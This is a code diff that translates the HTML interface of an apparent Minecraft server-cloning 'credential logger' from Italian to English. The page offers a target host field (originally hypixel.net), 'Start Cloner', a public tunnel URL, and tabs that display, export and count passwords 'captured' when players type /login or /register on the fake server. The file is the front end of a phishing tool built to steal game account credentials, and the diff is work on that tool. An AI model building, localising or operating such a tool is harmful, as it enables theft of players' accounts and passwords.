@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="it">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -36,20 +36,20 @@
                 <h3><i class="fas fa-server"></i> Server Target</h3>
                 <div class="input-group">
                     <label>Host Server</label>
-                    <input type="text" id="serverHost" placeholder="hypixel.net" value="">
+                    <input type="text" id="serverHost" placeholder="myserver.net" value="">
                 </div>
                 <div class="input-group">
-                    <label>Porta</label>
+                    <label>Port</label>
                     <input type="number" id="serverPort" placeholder="25565" value="25565">
                 </div>
                 <button class="btn-primary" id="scanBtn">
-                    <i class="fas fa-search"></i> Scansiona Server
+                    <i class="fas fa-search"></i> Scan Server
                 </button>
                 <button class="btn-success" id="startBtn">
-                    <i class="fas fa-play"></i> Avvia Cloner
+                    <i class="fas fa-play"></i> Start Cloner
                 </button>
                 <button class="btn-danger" id="stopBtn" disabled>
-                    <i class="fas fa-stop"></i> Ferma Cloner
+                    <i class="fas fa-stop"></i> Stop Cloner
                 </button>
             </div>
 
@@ -57,29 +57,29 @@
                 <h3><i class="fas fa-info-circle"></i> Info Server</h3>
                 <div class="server-info" id="serverInfo">
                     <div class="info-item">
-                        <span class="info-label">Stato:</span>
-                        <span class="info-value" id="serverStatus">Non connesso</span>
+                        <span class="info-label">Status:</span>
+                        <span class="info-value" id="serverStatus">Not connected</span>
                     </div>
                     <div class="info-item">
-                        <span class="info-label">Versione:</span>
+                        <span class="info-label">Version:</span>
                         <span class="info-value" id="serverVersion">-</span>
                     </div>
                     <div class="info-item">
-                        <span class="info-label">Giocatori:</span>
+                        <span class="info-label">Players:</span>
                         <span class="info-value" id="serverPlayers">-</span>
                     </div>
                     <div class="info-item">
                         <span class="info-label">Tunnel:</span>
-                        <span class="info-value" id="tunnelStatus">Inattivo</span>
+                        <span class="info-value" id="tunnelStatus">Inactive</span>
                     </div>
                 </div>
             </div>
 
             <div class="sidebar-section">
-                <h3><i class="fas fa-link"></i> URL Pubblico</h3>
+                <h3><i class="fas fa-link"></i> Public URL</h3>
                 <div class="url-container" id="publicUrlContainer">
-                    <input type="text" id="publicUrl" readonly placeholder="Nessun tunnel attivo">
-                    <button class="btn-copy" id="copyUrlBtn" title="Copia URL">
+                    <input type="text" id="publicUrl" readonly placeholder="No active tunnel">
+                    <button class="btn-copy" id="copyUrlBtn" title="Copy URL">
                         <i class="fas fa-copy"></i>
                     </button>
                 </div>
@@ -94,10 +94,10 @@
                     <i class="fas fa-terminal"></i> Console
                 </button>
                 <button class="tab" data-tab="credentials">
-                    <i class="fas fa-key"></i> Credenziali
+                    <i class="fas fa-key"></i> Credentials
                 </button>
                 <button class="tab" data-tab="stats">
-                    <i class="fas fa-chart-bar"></i> Statistiche
+                    <i class="fas fa-chart-bar"></i> Statistics
                 </button>
             </div>
 
@@ -106,17 +106,17 @@
                 <div class="console-header">
                     <h2><i class="fas fa-terminal"></i> Output Console</h2>
                     <button class="btn-secondary" id="clearConsoleBtn">
-                        <i class="fas fa-trash"></i> Pulisci
+                        <i class="fas fa-trash"></i> Clear
                     </button>
                 </div>
                 <div class="console" id="console">
                     <div class="console-line welcome">
-                        <span class="timestamp">[SISTEMA]</span>
-                        <span class="message">🎯 CREDENTIAL LOGGER pronto all'uso</span>
+                        <span class="timestamp">[SYSTEM]</span>
+                        <span class="message">🎯 CREDENTIAL LOGGER ready to use</span>
                     </div>
                     <div class="console-line welcome">
                         <span class="timestamp">[INFO]</span>
-                        <span class="message">Inserisci un server target e clicca "Avvia Cloner"</span>
+                        <span class="message">Enter a target server and click "Start Cloner"</span>
                     </div>
                 </div>
             </div>
@@ -124,16 +124,16 @@
             <!-- Credentials Tab -->
             <div class="tab-content" id="credentialsTab">
                 <div class="credentials-header">
-                    <h2><i class="fas fa-key"></i> Credenziali Catturate</h2>
+                    <h2><i class="fas fa-key"></i> Captured Credentials</h2>
                     <div class="credentials-actions">
                         <button class="btn-warning" id="clearCredsBtn">
-                            <i class="fas fa-trash"></i> Cancella Tutto
+                            <i class="fas fa-trash"></i> Clear All
                         </button>
                         <button class="btn-success" id="exportCredsBtn">
-                            <i class="fas fa-download"></i> Esporta
+                            <i class="fas fa-download"></i> Export
                         </button>
                         <button class="btn-secondary" id="refreshCredsBtn">
-                            <i class="fas fa-refresh"></i> Aggiorna
+                            <i class="fas fa-refresh"></i> Refresh
                         </button>
                         <button class="btn-warning" id="testCredsBtn">
                             <i class="fas fa-vial"></i> Test
@@ -143,8 +143,8 @@
                 <div class="credentials-container" id="credentialsContainer">
                     <div class="no-data">
                         <i class="fas fa-key"></i>
-                        <p>Nessuna credenziale catturata</p>
-                        <small>Le credenziali appariranno qui quando i giocatori useranno /login o /register</small>
+                        <p>No credentials captured</p>
+                        <small>Credentials will appear here when players use /login or /register</small>
                     </div>
                 </div>
             </div>
@@ -152,7 +152,7 @@
             <!-- Stats Tab -->
             <div class="tab-content" id="statsTab">
                 <div class="stats-header">
-                    <h2><i class="fas fa-chart-bar"></i> Statistiche</h2>
+                    <h2><i class="fas fa-chart-bar"></i> Statistics</h2>
                 </div>
                 <div class="stats-grid">
                     <div class="stat-card">
@@ -161,7 +161,7 @@
                         </div>
                         <div class="stat-info">
                             <div class="stat-value" id="totalConnections">0</div>
-                            <div class="stat-label">Connessioni Totali</div>
+                            <div class="stat-label">Total Connections</div>
                         </div>
                     </div>
                     <div class="stat-card">
@@ -170,7 +170,7 @@
                         </div>
                         <div class="stat-info">
                             <div class="stat-value" id="totalCredentials">0</div>
-                            <div class="stat-label">Credenziali Catturate</div>
+                            <div class="stat-label">Captured Credentials</div>
                         </div>
                     </div>
                     <div class="stat-card">
@@ -179,7 +179,7 @@
                         </div>
                         <div class="stat-info">
                             <div class="stat-value" id="uniqueUsers">0</div>
-                            <div class="stat-label">Utenti Unici</div>
+                            <div class="stat-label">Unique Users</div>
                         </div>
                     </div>
                     <div class="stat-card">
@@ -188,7 +188,7 @@
                         </div>
                         <div class="stat-info">
                             <div class="stat-value" id="uptime">00:00:00</div>
-                            <div class="stat-label">Tempo Attività</div>
+                            <div class="stat-label">Uptime</div>
                         </div>
                     </div>
                 </div>
@@ -200,7 +200,7 @@
     <div class="status-bar">
         <div class="status-left">
             <span class="status-indicator" id="statusIndicator">●</span>
-            <span id="statusText">Pronto</span>
+            <span id="statusText">Ready</span>
         </div>
         <div class="status-right">
             <span id="timeDisplay"></span>
@@ -211,7 +211,7 @@
     <div class="loading-overlay" id="loadingOverlay">
         <div class="loading-spinner">
             <i class="fas fa-spinner fa-spin"></i>
-            <p id="loadingText">Caricamento...</p>
+            <p id="loadingText">Loading...</p>
         </div>
     </div>
 
